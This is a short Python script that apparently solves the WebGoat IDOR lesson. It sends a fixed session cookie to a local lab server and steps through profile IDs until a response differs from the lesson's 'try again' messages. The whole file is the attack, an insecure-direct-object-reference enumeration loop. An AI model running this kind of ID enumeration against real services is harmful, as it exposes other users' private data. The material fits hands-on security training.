import requests

headers = {
    "Cookie": "JSESSIONID=ATkHs1tpOv3A_TMlUYh722s_sVE5kLiQMy9TZY8T"
}

url_template = "http://192.168.8.124:8080/WebGoat/IDOR/profile/{}"

target_id = 2342384
stop_conditions = [
    b'{\r\n  "lessonCompleted" : false,\r\n  "feedback" : "Try again. You need to use the same method\\\\/URL you used to access your own profile via direct object reference.",\r\n  "output" : null,\r\n  "assignment" : "IDORViewOtherProfile",\r\n  "attemptWasMade" : true\r\n}',
    b'{\r\n  "lessonCompleted" : false,\r\n  "feedback" : "You\'re on the right path, try a different id",\r\n  "output" : null,\r\n  "assignment" : "IDORViewOtherProfile",\r\n  "attemptWasMade" : true\r\n}'
]

current_id = 2342  # Starting ID, adjust if necessary

while current_id <= target_id:
    url = url_template.format(current_id)
    r = requests.get(url, headers=headers)
    
    if r.content not in stop_conditions:
        break
    
    current_id += 1

# After the loop, you can print the id that succeeded or take other actions
print(f"Stopped at ID: {current_id}")
print(f"Response: {r.content}")
